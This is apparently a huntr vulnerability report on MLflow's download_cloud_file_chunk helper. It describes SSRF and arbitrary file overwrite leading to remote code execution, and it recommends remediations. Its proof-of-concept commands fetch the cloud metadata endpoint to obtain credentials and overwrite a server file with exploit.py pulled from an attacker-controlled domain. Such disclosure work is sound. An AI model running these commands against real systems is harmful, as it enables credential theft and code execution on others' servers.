# Insufficient path/URL sanitization enables arbitrary file overwrites & SSRF, ultimately resulting in RCE in [mlflow/mlflow](https://github.com/mlflow/mlflow)

| Field                  | Details                                                                                          |
| ---------------------- | ------------------------------------------------------------------------------------------------ |
| **Affected Software**  | MLflow v3.10.0 (latest)                                                                          |
| **Vendor**             | MLflow / Databricks                                                                              |
| **Repository**         | [mlflow/mlflow](https://github.com/mlflow/mlflow)                                                |
| **Vulnerability Type** | SSRF + Arbitrary File Overwrite → Remote Code Execution (RCE)                                   |
| **CWE**                | CWE-918 — Server-Side Request Forgery / CWE-22 — Path Traversal                                 |
| **Severity**           | Critical                                                                                         |
| **Attack Vector**      | Network (unauthenticated remote)                                                                 |

---

## Executive Summary

A critical vulnerability has been identified in MLflow's `download_cloud_file_chunk` utility and its underlying `download_chunk` function in `mlflow/utils/request_utils.py`. Due to the complete absence of URL scheme validation and download path sanitization, an attacker who controls either argument can (1) perform Server-Side Request Forgery (SSRF) by redirecting the HTTP request to internal infrastructure such as the cloud instance metadata endpoint, and (2) overwrite arbitrary files on the host filesystem — including the running application itself — by supplying a crafted `--download-path` value. Chaining both vectors enables full Remote Code Execution.

---

## Technical Description

### Entry Point

The vulnerability originates in `mlflow/utils/download_cloud_file_chunk.py`, an internal helper module invoked as a subprocess by `file_utils.py` and other MLflow utilities. It is also directly invocable from the command line via `python3 -m mlflow.utils.download_cloud_file_chunk`. The module parses five arguments from the caller without applying any security-relevant validation before passing them downstream:

```python
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--range-start", required=True, type=int)
    parser.add_argument("--range-end", required=True, type=int)
    parser.add_argument("--headers", required=True, type=str)
    parser.add_argument("--download-path", required=True, type=str)
    parser.add_argument("--http-uri", required=True, type=str)
    return parser.parse_args()


def main():
    file_path = os.path.join(os.path.dirname(__file__), "request_utils.py")
    module_name = "mlflow.utils.request_utils"

    spec = importlib.util.spec_from_file_location(module_name, file_path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = module
    spec.loader.exec_module(module)
    download_chunk = module.download_chunk

    args = parse_args()
    download_chunk(
        range_start=args.range_start,
        range_end=args.range_end,
        headers=json.loads(args.headers),
        download_path=args.download_path,
        http_uri=args.http_uri,
    )
```

The two attacker-controlled parameters of interest are `--http-uri` and `--download-path`, which flow directly into the `download_chunk` function.

### Validation Weaknesses

The `download_chunk` function in `mlflow/utils/request_utils.py` passes both parameters into HTTP and file I/O operations without any validation:

```python
def download_chunk(*, range_start, range_end, headers, download_path, http_uri):
    combined_headers = {**headers, "Range": f"bytes={range_start}-{range_end}"}

    with cloud_storage_http_request(
        "get",
        http_uri,         # ← no scheme, host, or allowlist validation
        stream=False,
        headers=combined_headers,
        timeout=10,
    ) as response:
        augmented_raise_for_status(response)
        with open(download_path, "r+b") as f:   # ← no path normalization or boundary check
            f.seek(range_start)
            f.write(response.content)
```

For `http_uri`, the function:

- Does **not** restrict the URL scheme to `s3://` or `https://<bucket>.s3.amazonaws.com`
- Does **not** validate the target hostname against an allowlist of trusted cloud storage endpoints
- Does **not** block requests to private IP ranges (`169.254.0.0/16`, `10.0.0.0/8`, `192.168.0.0/16`)
- Allows arbitrary HTTP/HTTPS URLs — including internal metadata endpoints — to be fetched

For `download_path`, the function:

- Does **not** enforce any file extension restriction
- Does **not** normalize or canonicalize the path
- Does **not** validate that the path resides within a permitted directory
- Passes the value directly to `open(download_path, "r+b")`, allowing any writable path on the filesystem to be targeted

### Vulnerable Execution Path

Once arguments pass through `parse_args()`, the full execution chain is:

1. `download_chunk()` is called with attacker-controlled `http_uri` and `download_path`.
2. `http_uri` is forwarded to `cloud_storage_http_request()`, which performs only a basic HTTP method check before passing the URL onward.

```python
def cloud_storage_http_request(method, url, ...):
    if method.lower() not in ("put", "get", "patch", "delete"):
        raise ValueError("Illegal http method: " + method)
    return _get_http_response_with_retries(method, url, ...)
```

3. `_get_http_response_with_retries()` performs the actual HTTP request using a `requests.Session`, with redirect following enabled by default (controlled only by the `MLFLOW_ALLOW_HTTP_REDIRECTS` environment variable, which defaults to `true`):

```python
def _get_http_response_with_retries(method, url, ...):
    session = _get_request_session(...)
    env_value = os.getenv("MLFLOW_ALLOW_HTTP_REDIRECTS", "true").lower() in ["true", "1"]
    allow_redirects = env_value if allow_redirects is None else allow_redirects
    return session.request(method, url, allow_redirects=allow_redirects, **kwargs)
```

4. The response body is written directly to `download_path` with no content inspection — whatever the server at `http_uri` returns is written verbatim to the target file.

> **Critical flaw:** Neither the URL nor the download path is validated at any point in this call chain. An attacker-controlled `http_uri` enables SSRF against internal infrastructure, and an attacker-controlled `download_path` enables arbitrary file overwrite — including overwriting the running application's own source files.

---

### Argument Sanitization Gap

There is no sanitization layer present anywhere across `download_cloud_file_chunk.py`, `download_chunk()`, `cloud_storage_http_request()`, or `_get_http_response_with_retries()` that would restrict the target URL to legitimate cloud storage or confine the output file to a safe directory.

The intended design of `download_cloud_file_chunk` implies that `http_uri` should only ever be a cloud object storage URL (`s3://` or `https://<bucket>.s3.amazonaws.com`). However, this constraint is never enforced in code. Any HTTP or HTTPS URL — including internal-only addresses — is accepted and fetched identically.

Similarly, `download_path` is intended to be a temporary staging path within MLflow's own workspace. No such boundary is enforced, and absolute paths such as `/var/www/html/server.py` or `/etc/cron.d/backdoor` are accepted and written to without restriction.

| Parameter       | Missing Validation                                                                                          |
| --------------- | ----------------------------------------------------------------------------------------------------------- |
| `--http-uri`    | No scheme allowlist, no hostname allowlist, no private IP blocklist, redirect following enabled by default  |
| `--download-path` | No extension check, no path normalization, no directory boundary enforcement                              |

---

## Proof of Concept

An attacker can exploit this vulnerability with the following steps:

### Step 1 — SSRF via crafted `--http-uri`

Supply the AWS instance metadata endpoint as the `--http-uri` value to exfiltrate cloud credentials from the host:

```bash
python3 -m mlflow.utils.download_cloud_file_chunk \
  --range-start 0 \
  --range-end 1024 \
  --headers '{"Authorization":"Bearer TOKEN"}' \
  --download-path output.bin \
  --http-uri http://169.254.169.254/latest/meta-data/
```

The response from the internal metadata service is fetched by the MLflow process and written to `output.bin`, giving the attacker access to instance identity, IAM role credentials, and other cloud metadata.

### Step 2 — Arbitrary file overwrite via crafted `--download-path`

Host a malicious Python payload on an attacker-controlled server and overwrite a live application file on the target:

```bash
python3 -m mlflow.utils.download_cloud_file_chunk \
  --range-start 0 \
  --range-end 1024 \
  --headers '{"Authorization":"Bearer TOKEN"}' \
  --download-path /var/www/html/server.py \
  --http-uri https://attacker-controlled-domain.com/exploit.py
```

The content of `exploit.py` is fetched from the attacker's server and written directly over `/var/www/html/server.py`. On the next request to the application, the injected code executes in the server process.

### Step 3 — Chained exploitation via Python API

The same attack can be triggered programmatically from within any Python environment where MLflow is installed, without requiring CLI access:

```python
import subprocess
import sys
import json
from mlflow.utils import download_cloud_file_chunk

subprocess.run(
    [
        sys.executable,
        download_cloud_file_chunk.__file__,
        "--range-start", "0",
        "--range-end", "1024",
        "--headers", json.dumps({}),
        "--download-path", "/var/www/html/server.py",
        "--http-uri", "https://attacker-controlled-domain.com/exploit.py",
    ],
    check=True,
)
```

> **Note:** Because `download_cloud_file_chunk` is invoked as a subprocess by MLflow's own `file_utils.py`, a caller who can influence artifact download parameters within a legitimate MLflow workflow may be able to trigger this attack path without any direct CLI access.

---

## Root Cause

The core issue lies in the **complete absence of input validation** on both `http_uri` and `download_path` across the entire call chain originating from `download_cloud_file_chunk.py`:

```
mlflow/utils/download_cloud_file_chunk.py (line 33)
https://github.com/mlflow/mlflow/blob/3ab871b6079e23d682c51e8fbdb14cd5a43cb071/mlflow/utils/download_cloud_file_chunk.py#L33
```

The function is designed exclusively for downloading cloud object storage chunks, yet it imposes no constraints whatsoever on the URL scheme, target host, or output path. Both parameters are passed verbatim from CLI arguments through the entire call chain into an HTTP request and a file write, with no interception point.

---

## Impact

Successful exploitation of this vulnerability may allow an attacker to:

- Perform **Server-Side Request Forgery (SSRF)** — access internal services, cloud metadata endpoints (`http://169.254.169.254/`), and other infrastructure unreachable from outside the network
- **Overwrite arbitrary files** on the host filesystem that the MLflow process has write access to — including running application source files, cron jobs, and configuration files
- Achieve **Remote Code Execution (RCE)** by overwriting a live application file with an attacker-controlled payload that executes on the next server request
- **Exfiltrate cloud credentials** (IAM roles, access keys, instance identity) via the metadata SSRF vector
- Compromise confidentiality, integrity, and availability of the host system and any connected cloud infrastructure

## Recommended Remediation

| #   | Recommendation                                                                                                                                                                                                              | Priority |
| --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |
| 1   | **Validate `http_uri` against an allowlist of permitted schemes and hosts** — only `s3://` and `https://<bucket-name>.s3.amazonaws.com` patterns should be accepted; reject all other schemes and hostnames.               | Critical |
| 2   | **Block requests to private and link-local IP ranges** — reject any URL that resolves to `169.254.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`, or `192.168.0.0/16` before the HTTP request is made.                            | Critical |
| 3   | **Validate the `download_path` file extension** — at minimum, restrict the output path to `.bin` or other expected staging file extensions; reject paths ending in `.py`, `.sh`, `.php`, or other executable extensions.   | High     |
| 4   | **Enforce a directory boundary on `download_path`** — use `os.path.realpath()` to canonicalize the path and assert it resides within MLflow's own designated artifact staging directory before opening the file for write.  | High     |
| 5   | **Disable HTTP redirects by default** — set `MLFLOW_ALLOW_HTTP_REDIRECTS` to `false` by default and require explicit opt-in, preventing redirect-based SSRF bypasses.                                                      | Medium   |

---

## Vulnerable Code Reference

```
https://github.com/mlflow/mlflow/blob/3ab871b6079e23d682c51e8fbdb14cd5a43cb071/mlflow/utils/download_cloud_file_chunk.py#L33
```

---

*Reported by [@mohamedabdelhady933](https://github.com/mohamedabdelhady933) via [huntr.com](https://huntr.com)*
